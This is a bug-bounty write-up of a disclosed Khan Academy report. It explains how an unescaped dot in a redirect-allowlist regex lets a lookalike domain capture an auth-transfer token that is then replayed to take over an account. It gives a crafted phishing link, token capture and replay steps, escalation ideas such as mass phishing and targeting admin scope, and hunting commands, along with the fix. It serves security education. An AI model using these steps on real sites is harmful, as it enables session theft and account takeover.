# Open Redirect + ATO - 1-Click Full Takeover via Unescaped Dot in Regex (Original: Khan Academy #3723458 - Critical 9.6)

> Original: https://hackerone.com/reports/3723458 | Reporter: farr | Disclosed: 2026-06-20 | Severity: Critical 9.6 | Asset: *.khanacademy.org `continue` param

## 1. TL;DR for Hunters
Login uses `?continue=<url>` to go to another subdomain after login. To move session, server creates a one-time `transfer_auth?key=TOKEN` and redirects you. Frontend checks destination with `KA_DOMAIN_REGEX`. Regex had `uc.a.run.app` with dots NOT escaped, so dot = any char. Attacker registers `xfarr-6fmjyrz2lq-uc-a-run.app` (dashes instead of dots), it still matches, victim gets redirected there with TOKEN in URL, attacker replays TOKEN on real site and gets KAAS/KAAL/KAAC cookies as victim. 1 click = full ATO.

## 2. Attack Surface & Context
- Flow: `classroom.khanacademy.org/login?continue=<evil>` → `calculateNextUrl` → `isKhanAcademyUrl()` → `maybeAddAuthTransfer()` → `createTransferAuthTokenMutation` → `302 https://evil/transfer_auth?key=TOKEN`
- Tech: SPA JS, file `libs/urls/src/regexp.ts` found via source map `https://cdn.kastatic.org/khanacademy/khanacademy.<hash>.js.map`
- Hunt same: any `?continue=`, `?next=`, `?redirect=`, `?returnUrl=`, `?callback=` that sends token/session in redirect. Especially SSO, cross-subdomain auth, OAuth `redirect_uri`.

## 3. Concepts Explained Simply (word-by-word)

Payload 1 - the regex:
```js
KA_DOMAIN_REGEX = /(^|\.)(khanacademy\.(org|dev|test|local)|kastatic\.org|.*-6fmjyrz2lq-uc.a.run.app)$/
```
- `/.../` = regex, a pattern matcher.
- `(^|\.)` = start of string OR a dot. Means match `khanacademy.org` or `.khanacademy.org` (subdomain).
- `khanacademy\.` = literal `khanacademy.` — `\` + `.` = escaped dot = only real dot. Safe.
- `(org|dev|test|local)` = one of these. `|` = OR.
- `kastatic\.org` = second allowed domain, dots escaped, safe.
- `|` = OR third option.
- `.*-6fmjyrz2lq-uc.a.run.app` = any prefix + fixed suffix. `.*` = any chars. BUT `.` between `uc`, `a`, `run`, `app` are NOT escaped. In regex, bare `.` = any single char (letter, dash, dot, digit). So `uc-a-run` matches `uc.a.run`.
- `$` = end of string. Must end with that suffix.

Whole: "Allow khanacademy.org/dev/test/local subdomains, kastatic.org, or any *-6fmjyrz2lq-uc?a?run?app where ? can be anything."

Payload 2 - the link:
```
https://classroom.khanacademy.org/login?continue=https%3A%2F%2Fxfarr-6fmjyrz2lq-uc-a-run.app%2F
```
- `classroom.khanacademy.org/login` = legit login page that supports cross-domain transfer.
- `?continue=` = "after login, go here".
- `%3A` = `:`, `%2F` = `/` (URL-encoded). Decoded = `https://xfarr-6fmjyrz2lq-uc-a-run.app/`
- Victim clicks, JS validates with regex above → passes (bug) → generates TOKEN → redirects to `https://xfarr.../transfer_auth?key=TOKEN&continue=/`

## 4. Step-by-Step Reproduction (with examples)
Step 1 - Register: buy `xfarr-6fmjyrz2lq-uc-a-run.app` (~$12). Set HTTPS, log requests.
```bash
python3 -m http.server 443 # or simple Flask to log ?key=
# log: GET /transfer_auth?key=abc123&continue=/
```
Step 2 - Craft: `https://classroom.khanacademy.org/login?continue=https%3A%2F%2Fxfarr-6fmjyrz2lq-uc-a-run.app%2F`
Step 3 - Victim clicks (logged in or logs in). Browser: `calculateNextUrl(continue)` → `isKhanAcademyUrl()` true → `maybeAddAuthTransfer()` → POST `createTransferAuthTokenMutation` → `302 https://xfarr.../transfer_auth?key=TOKEN`
Step 4 - Capture: attacker log shows `key=TOKEN`. Token NOT consumed because attacker domain has no Khan JS to call consume.
Step 5 - Replay in incognito: open `https://www.khanacademy.org/transfer_auth?key=TOKEN&continue=/` → SPA calls `transferAuthMutation(key)` → Go backend validates → `Set-Cookie: KAAS=...; KAAL=...; KAAC=...` → attacker is victim.
`instructor-added example` for local test:
```js
re = /(^|\.)(.*-6fmjyrz2lq-uc.a.run.app)$/
re.test("xfarr-6fmjyrz2lq-uc-a-run.app") // true = bug
re.test("evil.com") // false
```

## 5. Root Cause Analysis
```js
// vulnerable
/.*-6fmjyrz2lq-uc.a.run.app$/ // . = any char
// fixed
/.*-6fmjyrz2lq-uc\.a\.run\.app$/ // \. = only dot
```
Plus design: auth token in URL query (leakable via Referer/logs) + auto-transfer on cross-host without user confirm + source maps in prod exposing validation logic.

## 6. Why It Slipped Past Devs
- Thought `khanacademy\.` escaped, so all dots escaped — missed last part.
- Regex looks correct at glance, no unit test for `uc-a-run` vs `uc.a.run`.
- Transfer flow assumed regex = security boundary, no second check server-side.
- Source map published, making white-box easy.

## 7. Advanced Completions - How to Take It Further
1. Other dot positions: `ucXaXrunXapp` with `X = - _ ~ %2e` — try all.
2. Subdomain trick: `evil.com?.khanacademy.org`, `khanacademy.org.evil.com` — does `$` anchor hold? Test.
3. `continue` on other hosts: `www`, `pt`, `es`, `discuss` — all *.khanacademy.org use same helper?
4. Token leak via Referer: if evil page loads image from collaborator, does `Referer: /transfer_auth?key=` leak further?
5. Token reuse / expiry: can you replay twice? How long valid? Can you pre-generate for mass phishing?
6. Cookie scope: KAAS on `.khanacademy.org` vs `www` — replay on which domain gives widest access (teacher/district admin)?
7. Source map mining: download `.js.map`, grep `REGEX|is.*Url|redirect|transferAuth` for second bypass.
8. Chain with XSS: if open redirect blocked, use `javascript:` or `data:`? Or upload assignment with link to increase click rate (classroom context).

## 8. Hunting Methodology Checklist
- [ ] Find all redirect params: Burp param miner + `?continue=FUZZ`, `?next=`, `?redirect=`, `?returnTo=`
- [ ] Test with `https://evil.com`, `https://whitelisted.com.evil.com`, `https://evilwhitelisted.com`
- [ ] If blocked, fetch JS + `.js.map`, grep `REGEX|DOMAIN|is.*Url|trusted`
- [ ] Copy regex to regex101.com, fuzz dot/dash/underscore
- [ ] Check if redirect carries `token=`, `key=`, `code=`, `session=` — that’s ATO, not just redirect
- [ ] Try register cheap `.app`, `.run.app` lookalike ($12) for PoC

## 9. Automation
```bash
# quick regex tester
node -e 'r=/(^|\.)(.*-6fmjyrz2lq-uc.a.run.app)$/; ["a-6fmjyrz2lq-uc.a.run.app","xfarr-6fmjyrz2lq-uc-a-run.app","evil.com"].forEach(h=>console.log(h,r.test(h)))'
# nuclei: ?continue=https://burpcollaborator.net/ + match Location header
```

## 10. Mitigation & Fix Review
Escape dots: `uc\.a\.run\.app`. Prefer allowlist compare via `new URL()` hostname exact/suffix check, not regex. Validate server-side too, not only SPA. Remove `.js.map` from prod. Make transfer token `httpOnly`, single-use, short TTL, bind to source session + audience domain, require user click confirm on cross-host. Verify: evil dash-domain → blocked, no `transfer_auth?key=` redirect.

## 11. Practice Lab
- regex101.com: paste vulnerable regex, test `uc-a-run` vs `uc.a.run`.
- PortSwigger OAuth/open-redirect labs, especially `redirect_uri` bypass + token leak.
- Local: `node` snippet above, then write fixed version and confirm evil fails.

## 12. Key Takeaway for Daily Hunting
Today grep JS for `DOMAIN_REGEX|is.*Url|trusted.*url`. Any unescaped `.` before TLD = register dash-variant for $5k+ open-redirect → token theft. `continue=` + `token in redirect` = always test ATO chain, not just redirect.
